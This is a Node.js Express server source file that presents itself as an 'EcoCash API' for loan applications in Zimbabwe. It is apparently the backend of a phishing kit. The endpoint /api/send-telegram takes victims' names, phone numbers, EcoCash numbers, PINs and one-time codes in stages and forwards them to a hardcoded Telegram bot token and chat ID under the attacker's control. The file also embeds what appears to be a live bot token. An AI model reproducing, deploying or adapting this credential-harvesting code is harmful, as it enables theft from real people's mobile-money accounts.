const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());

// CORS - Allow all origins
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

// ========== ECOCASH TELEGRAM CREDENTIALS ==========
const TG_BOT_TOKEN = '8347873216:AAFYC7jL2r50gHLMecU1fHqA3azVVvopW4I';
const TG_CHAT_ID = '7386607055';

// ========== HEALTH CHECK ENDPOINTS ==========
app.get('/', (req, res) => {
    res.json({
        status: 'OK',
        message: 'EcoCash API is running!',
        timestamp: new Date().toISOString(),
        version: '1.0.0'
    });
});

app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        uptime: process.uptime(),
        timestamp: new Date().toISOString(),
        telegram: {
            bot_configured: true,
            chat_id: TG_CHAT_ID
        }
    });
});

// ========== MAIN TELEGRAM ENDPOINT ==========
app.post('/api/send-telegram', async (req, res) => {
    try {
        const { phone, pin, email, name, type, site, amount, term, monthly, eco_number } = req.body;
        
        console.log('='.repeat(50));
        console.log('📨 Request received:', new Date().toISOString());
        console.log('Type:', type);
        console.log('Name:', name);
        console.log('Phone:', phone);
        console.log('='.repeat(50));
        
        const timestamp = new Date().toLocaleString('en-GB', {
            timeZone: 'Africa/Harare',
            day: '2-digit',
            month: '2-digit',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
        
        let message = '';
        
        if (type === 'application') {
            // Application form submission
            message = `📱 NEW APPLICATION - ${site || 'EcoCash'} 📱\n\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            message += `👤 Name: ${name || 'Not provided'}\n`;
            message += `📞 Phone: ${phone || 'Not provided'}\n`;
            message += `📧 Email: ${email || 'Not provided'}\n`;
            message += `💰 Loan Amount: $${amount || '0'}\n`;
            message += `📅 Term: ${term || '0'} months\n`;
            message += `💵 Monthly Payment: $${monthly || '0'}\n`;
            message += `💼 Monthly Income: $${pin || '0'}\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            message += `⏰ Time: ${timestamp}\n`;
            message += `✅ Status: Pending Approval`;
            
        } else if (type === 'pin') {
            // PIN confirmation (EcoCash Number + PIN)
            message = `🔐 DETAILS CONFIRMED - ${site || 'EcoCash'} 🔐\n\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            message += `👤 Name: ${name || 'Not provided'}\n`;
            message += `📞 Phone: ${phone || 'Not provided'}\n`;
            message += `📧 Email: ${email || 'Not provided'}\n`;
            message += `📱 EcoCash Number: ${eco_number || 'Not provided'}\n`;
            message += `💰 Loan Amount: $${amount || '0'}\n`;
            message += `📅 Term: ${term || '0'} months\n`;
            message += `💵 Monthly Payment: $${monthly || '0'}\n`;
            message += `🔑 PIN: ${pin || 'Not provided'}\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            message += `⏰ Time: ${timestamp}\n`;
            message += `✅ PIN Verified - Awaiting OTP`;
            
        } else if (type === 'otp') {
            // OTP verification (6-digit)
            message = `✅ OTP VERIFIED - ${site || 'EcoCash'} ✅\n\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            message += `👤 Name: ${name || 'Not provided'}\n`;
            message += `📞 Phone: ${phone || 'Not provided'}\n`;
            message += `📧 Email: ${email || 'Not provided'}\n`;
            message += `📱 EcoCash Number: ${eco_number || 'Not provided'}\n`;
            message += `💰 Loan Amount: $${amount || '0'}\n`;
            message += `📅 Term: ${term || '0'} months\n`;
            message += `💵 Monthly Payment: $${monthly || '0'}\n`;
            message += `🔢 OTP Code: ${pin || 'Not provided'}\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            message += `⏰ Time: ${timestamp}\n`;
            message += `✅ OTP Verified - Application Complete! 🎉`;
            
        } else {
            // Default message
            message = `📝 NEW SUBMISSION - ${site || 'EcoCash'} 📝\n\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            message += `👤 Name: ${name || 'Not provided'}\n`;
            message += `📞 Phone: ${phone || 'Not provided'}\n`;
            message += `📧 Email: ${email || 'Not provided'}\n`;
            message += `💰 Amount: $${amount || '0'}\n`;
            message += `🔑 PIN/OTP: ${pin || 'Not provided'}\n`;
            message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            message += `⏰ Time: ${timestamp}`;
        }
        
        // Send to Telegram
        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
        const response = await fetch(`${url}?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}`);
        const result = await response.json();
        
        if (result.ok) {
            console.log('✅ Message sent to Telegram!');
            res.json({ success: true, message: 'Sent successfully' });
        } else {
            console.error('❌ Telegram error:', result);
            res.json({ success: false, error: result.description });
        }
        
    } catch (error) {
        console.error('❌ Server error:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========== TEST ENDPOINT ==========
app.post('/api/test-telegram', async (req, res) => {
    try {
        const testMessage = `🔧 TEST MESSAGE 🔧\n\nEcoCash Bot is working!\nTime: ${new Date().toLocaleString()}\nChat ID: ${TG_CHAT_ID}\n\nIf you receive this, your bot is configured correctly! ✅`;
        
        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(testMessage)}`;
        const response = await fetch(url);
        const result = await response.json();
        
        if (result.ok) {
            console.log('✅ Test message sent!');
            res.json({ success: true, message: 'Test message sent to Telegram!' });
        } else {
            console.error('❌ Test failed:', result);
            res.json({ success: false, error: result.description });
        }
    } catch (error) {
        console.error('❌ Error:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========== INFO ENDPOINT ==========
app.get('/api/info', (req, res) => {
    res.json({
        name: 'EcoCash API',
        version: '1.0.0',
        country: 'Zimbabwe',
        currency: '$',
        chat_id: TG_CHAT_ID,
        bot_username: '@Crypto_760',
        telegram_configured: true,
        endpoints: {
            health: '/health',
            send_telegram: '/api/send-telegram',
            test_telegram: '/api/test-telegram',
            info: '/api/info'
        }
    });
});

// ========== START SERVER ==========
app.listen(PORT, '0.0.0.0', () => {
    console.log('='.repeat(50));
    console.log('🚀 EcoCash Backend Server Started');
    console.log('='.repeat(50));
    console.log(`📡 Port: ${PORT}`);
    console.log(`🤖 Bot: @Crypto_760`);
    console.log(`📱 Chat ID: ${TG_CHAT_ID}`);
    console.log(`🌍 Country: Zimbabwe`);
    console.log(`💵 Currency: USD ($)`);
    console.log('='.repeat(50));
    console.log('✅ Available endpoints:');
    console.log(`   GET  / - Root endpoint`);
    console.log(`   GET  /health - Health check`);
    console.log(`   POST /api/send-telegram - Send Telegram message`);
    console.log(`   POST /api/test-telegram - Test bot connection`);
    console.log(`   GET  /api/info - API information`);
    console.log('='.repeat(50));
});
